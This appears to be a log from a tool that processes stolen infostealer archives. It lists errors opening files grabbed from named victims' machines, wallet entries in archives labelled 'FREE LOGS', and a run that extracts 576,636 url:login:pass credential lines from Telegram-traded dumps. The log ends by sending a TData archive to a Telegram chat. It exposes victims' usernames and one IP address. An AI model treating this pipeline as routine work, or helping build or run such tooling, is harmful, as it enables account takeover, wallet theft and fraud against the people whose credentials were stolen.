+[2026-06-21 04:18:40] ERROR | CC archive Keygen Corel 2017.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_a60031082bd04862a644152ac07bf984\BR[71593210121FBB7771961A2CBB07C868] [2022-03-18T18_05_47.85\FileGrabber\Users\Amanda\Documents\Keygen Corel 2017.rar'
+[2026-06-21 04:18:43] ERROR | CC archive Wondershare-PDF-Password-Remover-V1.5.0-With-Key-[iahq76]-Full-Version.zip | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:19:07] ERROR | CC archive AppNee.com.Corel.All.Products.Universal.Keygen.by.X-Force.2021.V2.7z | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_827e193c20944120aac07396ef16016f\PK[DEDB5BC4F86071A6FCEF72A50FEAA570] [2022-03-16T02_08_05.39\FileGrabber\Users\Farooq\Documents\AppNee.com.Corel.All.Products.Universal.Keygen.by.X-Force.2021.V2.7z'
+[2026-06-21 04:19:08] ERROR | CC archive Keygen.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_5be411e8edb9429e90b71a1debd9a731\NG[A95F74B3DFB7D297EC46ED50AA106E44] [2022-04-03T04_19_17.24\FileGrabber\Users\CIVIL UNIT\Documents\Keygen.rar'
+[2026-06-21 04:19:46] ERROR | CC archive universal.xforce.keygen.Autodesk.2019.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_cabd9d34f1744056b30b578c74b2c40f\EG[3D412F17FD77A9A708D72AD1758C768C] [2022-03-27T12_32_05.60\FileGrabber\Users\Lenovo\Desktop\universal.xforce.keygen.Autodesk.2019.rar'
+[2026-06-21 04:20:07] ERROR | CC archive KeyRep by aluth.com.rar | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:20:08] ERROR | CC archive produkey.zip | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_4e0a23ad2f364df78116d7fa3e0df2b4\CO[558E8C51122D9504FE0A76FD1DFA4E30] [2022-05-19T23_07_08.8833579]\FileGrabber\Users\Mateus\Desktop\produkey.zip'
+[2026-06-21 04:20:12] ERROR | CC archive winproductkey.zip | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_2f43abfeb2dd4f81983e760e78c6498e\MY[1D0091E7402F47BCEAA79A4A304C73DD] [2022-05-10T19_36_54.3295782]\FileGrabber\Users\bardz\Documents\winproductkey.zip'
+[2026-06-21 04:20:17] ERROR | CC archive avast_cleanup_premium_22_1_6921_crack___activation_key_download_2022.zip | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:20:30] ERROR | CC archive 4MeKey Crack.rar | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:20:39] ERROR | CC archive Euro.Truck.Simulator.2.1.40.part09.rar | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:20:39] ERROR | CC archive Euro.Truck.Simulator.2.1.40.part10.rar | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:20:39] ERROR | CC archive Euro.Truck.Simulator.2.1.40.part11.rar | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:20:49] ERROR | CC archive microsoft.prerelease_protected.mainos_lang_mk-mk.spkg_5718e6d08132face5e266dc09889b1797db20685.cab | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:20:54] ERROR | CC archive VG Tool 4.1_KeyGEN.rar | IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_CC_a940dcd4fc3d4945adf9aee5301c36c8\23338_MX_189.180.39.74_30_04_2026\Files\Desktop\cel\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 04:20:58] ERROR | CC archive RKT_rockusb-v3.00_2013_pass-1111.7z | DataErrorException: Data Error
+[2026-06-21 04:26:58] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar | InvalidOperationException: unpacked file size does not match header: expected 75511 found 75520
+[2026-06-21 04:26:59] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar | InvalidOperationException: unpacked file size does not match header: expected 3333112 found 3333120
+[2026-06-21 04:26:59] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar | InvalidOperationException: unpacked file size does not match header: expected 806575 found 806576
+[2026-06-21 04:26:59] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar | InvalidOperationException: unpacked file size does not match header: expected 154740 found 154752
+[2026-06-21 04:26:59] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar | InvalidOperationException: unpacked file size does not match header: expected 153662 found 153664
+[2026-06-21 04:26:59] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar | InvalidOperationException: unpacked file size does not match header: expected 1520956 found 1520960
+[2026-06-21 04:26:59] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar | InvalidOperationException: unpacked file size does not match header: expected 150725 found 150736
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 114052 found 114064
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2068781 found 2068784
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2227675 found 2227680
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2375882 found 2375888
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2483037 found 2483040
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2166760 found 2166768
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 551016 found 551024
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2196077 found 2196080
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 97513 found 97520
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 511693 found 511696
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 989601 found 989616
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 991081 found 991088
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 3672769 found 3672784
+[2026-06-21 04:27:00] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 984231 found 984240
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 348811 found 348816
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2375597 found 2375600
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2483038 found 2483040
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1228257 found 1228272
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2996527 found 2996528
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2670785 found 2670800
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1971329 found 1971344
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 887201 found 887216
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1269927 found 1269936
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1269064 found 1269072
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2137540 found 2137552
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1269103 found 1269104
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 843710 found 843712
+[2026-06-21 04:27:01] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 138377 found 138384
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 182196 found 182208
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 551057 found 551072
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 280542 found 280544
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 250173 found 250176
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2048301 found 2048304
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2070465 found 2070480
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 318247 found 318256
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1828251 found 1828256
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 237139 found 237152
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1510748 found 1510752
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 530963 found 530976
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1399007 found 1399008
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 3951814 found 3951824
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 570566 found 570576
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1293867 found 1293872
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1625489 found 1625504
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 704167 found 704176
+[2026-06-21 04:27:02] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1450603 found 1450608
+[2026-06-21 04:27:03] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2457418 found 2457424
+[2026-06-21 04:27:03] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1317816 found 1317824
+[2026-06-21 04:27:03] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1215802 found 1215808
+[2026-06-21 04:27:03] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 680895 found 680896
+[2026-06-21 04:27:03] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2738713 found 2738720
+[2026-06-21 04:27:03] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 3770858 found 3770864
+[2026-06-21 04:27:03] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 4075943 found 4075952
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 517876 found 517888
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 499127 found 499136
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 168450 found 168464
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 2358093 found 2358096
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 282472 found 282480
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1126998 found 1127008
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1184780 found 1184784
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 947611 found 947616
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1653636 found 1653648
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 918356 found 918368
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 163879 found 163888
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1456885 found 1456896
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 88379 found 88384
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1475975 found 1475984
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1480855 found 1480864
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1741855 found 1741856
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 1482129 found 1482144
+[2026-06-21 04:27:04] ERROR | Wallet entry in ⚡️Luffich&Cloud FREE LOGS⚡️.rar | InvalidOperationException: unpacked file size does not match header: expected 533778 found 533792
+[2026-06-21 21:40:57] ============================================================
+[2026-06-21 21:40:57] Archive to ULP started | items: 5 | mode: Archives | threads: 5
+[2026-06-21 21:40:57] Password pre-check started for 5 archive(s).
+[2026-06-21 21:41:00] PASSWORD @fatetraffic 2450 MIX 21-06-2026.rar -> settings password | solid=False type=Rar
+[2026-06-21 21:41:01] PASSWORD @Sheen_Links Free 22 June.zip -> settings password | solid=False type=Zip
+[2026-06-21 21:41:01] PASSWORD @Sheen_Links Free Cloud 14.06.2026.rar -> settings password | solid=False type=Rar
+[2026-06-21 21:41:02] PASSWORD @UP_DAISYCLOUD_CHAMPIONING!_21_JUNE_5223_ON_CHANNEL.rar -> settings password | solid=False type=Rar
+[2026-06-21 21:41:04] PASSWORD FR3SH L0GS 35K PCS @KURZL0GS_UP.rar -> settings password | solid=False type=Rar
+[2026-06-21 21:41:04] Password pre-check done: 5/5 openable.
+[2026-06-21 21:41:36] SCAN @fatetraffic 2450 MIX 21-06-2026.rar | solid=False type=Rar entries=66481 pwFiles=2221 combos=273015 fails=0 time=00:00:32
+[2026-06-21 21:41:36] @fatetraffic 2450 MIX 21-06-2026.rar -> COMPLETED SUCCESSFULLY (152.032 url:login:pass found, 2221 files) [password: settings password] [00:00:32]
+[2026-06-21 21:41:42] SCAN @Sheen_Links Free 22 June.zip | solid=False type=Zip entries=67099 pwFiles=1805 combos=107315 fails=0 time=00:00:05
+[2026-06-21 21:41:42] @Sheen_Links Free 22 June.zip -> COMPLETED SUCCESSFULLY (66.551 url:login:pass found, 1805 files) [password: settings password] [00:00:05]
+[2026-06-21 21:42:07] SCAN @Sheen_Links Free Cloud 14.06.2026.rar | solid=False type=Rar entries=57707 pwFiles=1450 combos=81437 fails=0 time=00:00:24
+[2026-06-21 21:42:07] @Sheen_Links Free Cloud 14.06.2026.rar -> COMPLETED SUCCESSFULLY (54.854 url:login:pass found, 1450 files) [password: settings password] [00:00:24]
+[2026-06-21 21:43:38] SCAN @UP_DAISYCLOUD_CHAMPIONING!_21_JUNE_5223_ON_CHANNEL.rar | solid=False type=Rar entries=131672 pwFiles=6725 combos=479945 fails=31 time=00:01:31
+[2026-06-21 21:43:38] @UP_DAISYCLOUD_CHAMPIONING!_21_JUNE_5223_ON_CHANNEL.rar -> COMPLETED SUCCESSFULLY (191.138 url:login:pass found, 6725 files) [password: settings password] [00:01:31]
+[2026-06-21 21:44:03] OPEN FAILED MOBILedit_Forensicpass 789789.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 21:44:14] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 21:44:17] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 21:44:58] SCAN FR3SH L0GS 35K PCS @KURZL0GS_UP.rar | solid=False type=Rar entries=141533 pwFiles=6008 combos=308624 fails=15 time=00:01:20
+[2026-06-21 21:44:58] FR3SH L0GS 35K PCS @KURZL0GS_UP.rar -> COMPLETED SUCCESSFULLY (112.061 url:login:pass found, 6008 files) [password: settings password] [00:01:20]
+[2026-06-21 21:44:58] Archive to ULP finished | unique lines: 576636 | failed: 0 | elapsed: 00:04:01
+[2026-06-21 22:16:38] ERROR | CC archive MOBILedit_Forensicpass 789789.rar | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 22:16:50] ERROR | CC archive RKT_rockusb-v3.00_2013_pass-1111.7z | DataErrorException: Data Error
+[2026-06-21 22:16:50] ERROR | CC archive RKT_rockusb-v3.00_2013_pass-1111.7z | DataErrorException: Data Error
+[2026-06-21 23:36:14] TELEGRAM queued TData1120.zip -> -1003972396261
+[2026-06-21 23:36:16] TELEGRAM SENT TData1120.zip -> -1003972396261
